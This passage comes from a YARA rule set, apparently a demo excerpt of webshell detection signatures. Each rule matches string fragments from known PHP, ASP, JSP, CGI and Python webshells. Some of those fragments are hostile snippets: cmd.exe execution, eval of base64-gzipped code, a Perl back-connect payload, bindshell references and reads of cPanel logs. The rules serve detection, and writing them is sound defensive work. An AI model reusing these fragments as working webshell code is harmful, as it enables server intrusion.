https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \".::[c0derz]::. web-shell\" \n      $s1 = \"http://c0derz.org.ua\" \n      $s2 = \"vint21h@c0derz.org.ua\" \n      $s3 = \"$name='63a9f0ea7bb98050796b649e85481845';//root\" \n   condition: \n      1 of them\n}\n\nrule Webshell_pHpINJ_php_php_RID2FFD : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file pHpINJ.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"News Remote PHP Shell Injection\" \n      $s3 = \"Php Shell <br />\" fullword\n      $s4 = \"<input type = \\\"text\\\" name = \\\"url\\\" value = \\\"\" \n   condition: \n      2 of them\n}\n\nrule Webshell_sig_2008_php_php_RID3060 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file 2008.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:37:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Codz by angel(4ngel)\" \n      $s1 = \"Web: http://www.4ngel.net\" \n      $s2 = \"$admin['cookielife'] = 86400;\" \n      $s3 = \"$errmsg = 'The file you want Downloadable was nonexistent';\" \n   condition: \n      1 of them\n}\n\nrule Webshell_ak74shell_php_php_RID3143 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ak74shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$res .= '<td align=\\\"center\\\"><a href=\\\"'.$xshell.'?act=chmod&file='.$_SESSION[\" \n      $s2 = \"AK-74 Security Team Web Site: www.ak74-team.net\" \n      $s3 = \"$xshell\" \n   condition: \n      2 of them\n}\n\nrule Webshell_zacosmall_php_RID3013 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file zacosmall.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:24:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rand(1,99999);$sj98\" \n      $s1 = \"$dump_file.='`'.$rows2[0].'`\" \n      $s3 = \"filename=\\\\\\\"dump_{$db_dump}_${table_d\" \n   condition: \n      2 of them\n}\n\nrule Webshell_CmdAsp_asp_RID2E81 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file CmdAsp.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:17:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"CmdAsp.asp\" \n      $s1 = \"Set oFileSys = Server.CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword\n      $s2 = \"-- Use a poor man's pipe ... a temp file --\" \n      $s3 = \"maceo @ dogmile.com\" \n   condition: \n      2 of them\n}\n\nrule Webshell_mysql_shell_php_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql_shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SooMin Kim\" \n      $s1 = \"smkim@popeye.snu.ac.kr\" \n      $s2 = \"echo \\\"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Reader_asp_RID2E9C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Reader.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mehdi & HolyDemon\" \n      $s2 = \"www.infilak.\" \n      $s3 = \"'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\\\"75%\" \n   condition: \n      2 of them\n}\n\nrule Webshell_jspshall_jsp_RID2FB3 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file jspshall.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kj021320\" \n      $s1 = \"case 'T':systemTools(out);break;\" \n      $s2 = \"out.println(\\\"<tr><td>\\\"+ico(50)+f[i].getName()+\\\"</td><td> file\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Webshell_php_Blocker_RID32A4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file webshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:13:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<die(\\\"Couldn't Read directory, Blocked!!!\\\");\" \n      $s3 = \"PHP Web Shell\" \n   condition: \n      all of them\n}\n\nrule Webshell_shells_PHP_wso_RID3030 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file wso.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$back_connect_p=\\\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi\" \n      $s3 = \"echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos\" \n   condition: \n      1 of them\n}\n\nrule Webshell_indexer_asp_RID2F38 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file indexer.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input typ\" \n      $s2 = \"D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\\\"submit\" \n   condition: \n      1 of them\n}\n\nrule Webshell_DxShell_php_php_RID30A8 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DxShell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:49:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s2 = \"print \\\"\\\\n\\\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><\" \n   condition: \n      1 of them\n}\n\nrule Webshell_kacak_asp_RID2E44 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file kacak.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Kacak FSO 1.0\" \n      $s1 = \"if request.querystring(\\\"TGH\\\") = \\\"1\\\" then\" \n      $s3 = \"<font color=\\\"#858585\\\">BuqX</font></a></font><font face=\\\"Verdana\\\" style=\" \n      $s4 = \"mailto:BuqX@hotmail.com\" \n   condition: \n      1 of them\n}\n\nrule Webshell_PHP_Backdoor_Connect_pl_php_RID351D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHP Backdoor Connect.pl.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LorD of IRAN HACKERS SABOTAGE\" \n      $s1 = \"LorD-C0d3r-NT\" \n      $s2 = \"echo --==Userinfo==-- ;\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Antichat_Shell_v1_3_php_RID3368 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Antichat Shell v1.3.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:46:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Antichat\" \n      $s1 = \"Can't open file, permission denide\" \n      $s2 = \"$ra44\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php_RID4390 : DEMO EXPLOIT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 02:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<option value=\\\"cat /var/cpanel/accounting.log\\\">/var/cpanel/accounting.log</opt\" \n      $s1 = \"Liz0ziM Private Safe Mode Command Execuriton Bypass\" \n      $s2 = \"echo \\\"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\\\";\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_Nshell__1__php_php_RID31A8 : DEMO T1033 T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Nshell (1).php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1033, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"Command : <INPUT TYPE=text NAME=cmd value=\\\".@stripslashes(htmlentities($\" \n      $s1 = \"if(!$whoami)$whoami=exec(\\\"whoami\\\"); echo \\\"whoami :\\\".$whoami.\\\"<br>\\\";\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_shankar_php_php_RID30DC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shankar.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-02-17\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $Author = \"ShAnKaR\" \n      $s0 = \"<input type=checkbox name='dd' \\\".(isset($_POST['dd'])?'checked':'').\\\">DB<input\" \n      $s3 = \"Show<input type=text size=5 value=\\\".((isset($_POST['br_st']) && isset($_POST['b\" \n   condition: \n      1 of ( $s* ) and $Author\n}\n\nrule Webshell_Casus15_php_php_RID3059 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Casus15.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy ( $dosya_gonder2, \\\"$dir/$dosya_gonder2_name\\\") ? print(\\\"$dosya_gonder2_na\" \n      $s2 = \"echo \\\"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'\" \n      $s3 = \"value='Calistirmak istediginiz \" \n   condition: \n      1 of them\n}\n\nrule Webshell_cmd_asp_5_1_asp_RID3044 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cmd-asp-5.1.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Call oS.Run(\\\"win.com cmd.exe /c del \\\"& szTF,0,True)\" fullword\n      $s3 = \"Call oS.Run(\\\"win.com cmd.exe /c \\\"\\\"\\\" & szCMD & \\\" > \\\" & szTF &\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_EFSO_2_asp_RID2E07 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file EFSO_2.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Ejder was HERE\" \n      $s1 = \"*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~\" \n   condition: \n      2 of them\n}\n\nrule Webshell_lamashell_php_RID3000 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file lamashell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lama's'hell\" fullword\n      $s1 = \"if($_POST['king'] == \\\"\\\") {\" \n      $s2 = \"if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\\\"/\\\".$_FILES['f\" \n   condition: \n      1 of them\n}\n\nrule Webshell_small_php_php_RID300D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file small.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$pass='abcdef1234567890abcdef1234567890';\" fullword\n      $s2 = \"eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1\" \n      $s4 = \"@ini_set('error_log',NULL);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_fuckphpshell_php_RID3156 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file fuckphpshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$succ = \\\"Warning! \" \n      $s1 = \"Don`t be stupid .. this is a priv3 server, so take extra care!\" \n      $s2 = \"\\\\*=-- MEMBERS AREA --=*/\" \n      $s3 = \"preg_match('/(\\\\n[^\\\\n]*){' . $cache_lines . '}$/', $_SESSION['o\" \n   condition: \n      2 of them\n}\n\nrule Webshell_ngh_php_php_RID2F31 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ngh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Cr4sh_aka_RKL\" \n      $s1 = \"NGH edition\" \n      $s2 = \"/* connectback-backdoor on perl\" \n      $s3 = \"<form action=<?=$script?>?act=bindshell method=POST>\" \n      $s4 = \"$logo = \\\"R0lGODlhMAAwAOYAAAAAAP////r\" \n   condition: \n      1 of them\n}\n\nrule Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 22:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend\" \n      $s3 = \" fputs ($fp ,\\\"\\\\n*********************************************\\\\nWelcome T0 Sim\" \n      $s4 = \"echo \\\"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora\" \n   condition: \n      1 of them\n}\n\nrule Webshell_RemExp_asp_RID2E9A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file RemExp.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<title>Remote Explorer</title>\" \n      $s3 = \" FSO.CopyFile Request.QueryString(\\\"FolderPath\\\") & Request.QueryString(\\\"CopyFi\" \n      $s4 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f\" \n   condition: \n      2 of them\n}\n\nrule Webshell_klasvayv_asp_RID2FBA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file klasvayv.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set aktifklas=request.querystring(\\\"aktifklas\\\")\" \n      $s2 = \"action=\\\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>\" \n      $s3 = \"<font color=\\\"#858585\\\">www.aventgrup.net\" \n      $s4 = \"style=\\\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Sincap_php_php_RID3052 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Sincap.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$baglan=fopen(\\\"/tmp/$ekinci\\\",'r');\" \n      $s2 = \"$tampon4=$tampon3-1\" \n      $s3 = \"@aventgrup.net\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Test_php_php_RID2F94 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Test.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$yazi = \\\"test\\\" . \\\"\\\\r\\\\n\\\";\" fullword\n      $s2 = \"fwrite ($fp, \\\"$yazi\\\");\" fullword\n      $s3 = \"$entry_line=\\\"HACKed by EntriKa\\\";\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_Zehir_4_asp_RID2EDE : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Zehir 4.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"</a><a href='\\\"&dosyapath&\\\"?status=10&dPath=\\\"&f1.path&\\\"&path=\\\"&path&\\\"&Time=\" \n      $s4 = \"<input type=submit value=\\\"Test Et!\\\" onclick=\\\"\" \n   condition: \n      1 of them\n}\n\nrule Webshell_wh_bindshell_py_RID30E1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file wh_bindshell.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:58:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#Use: python wh_bindshell.py [port] [password]\" \n      $s2 = \"python -c\\\"import md5;x=md5.new('you_password');print x.hexdigest()\\\"\" fullword\n      $s3 = \"#bugz: ctrl+c etc =script stoped=\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_lurm_safemod_on_cgi_RID3272 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file lurm_safemod_on.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Network security team :: CGI Shell\" fullword\n      $s1 = \"#########################<<KONEC>>#####################################\" fullword\n      $s2 = \"##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_backupsql_php_often_with_c99shell_RID37F5 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backupsql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 18:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"//$message.= \\\"--{$mime_boundary}\\\\n\\\" .\\\"Content-Type: {$fileatt_type};\\\\n\\\" .\" \n      $s4 = \"$ftpconnect = \\\"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog\" \n   condition: \n      all of them\n}\n\nrule Webshell_uploader_php_php_RID3150 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file uploader.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"move_uploaded_file($userfile, \\\"entrika.php\\\"); \" fullword\n      $s3 = \"Send this file: <INPUT NAME=\\\"userfile\\\" TYPE=\\\"file\\\">\" fullword\n      $s4 = \"<INPUT TYPE=\\\"hidden\\\" name=\\\"MAX_FILE_SIZE\\\" value=\\\"100000\\\">\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_Dx_php_php_RID2EB0 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Dx.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s2 = \"$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util\" \n      $s3 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERVER['HTTP\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Rem_View_php_php_RID3112 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Rem View.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$php=\\\"/* line 1 */\\\\n\\\\n// \\\".mm(\\\"for example, uncomment next line\\\").\\\"\" \n      $s2 = \"<input type=submit value='\\\".mm(\\\"Delete all dir/files recursive\\\").\\\" (rm -fr)'\" \n      $s4 = \"Welcome to phpRemoteView (RemView)\" \n   condition: \n      1 of them\n}\n\nrule Webshell_phpjackal_php_RID2FFB : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpjackal.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$dl=$_REQUEST['downloaD'];\" \n      $s4 = \"else shelL(\\\"perl.exe $name 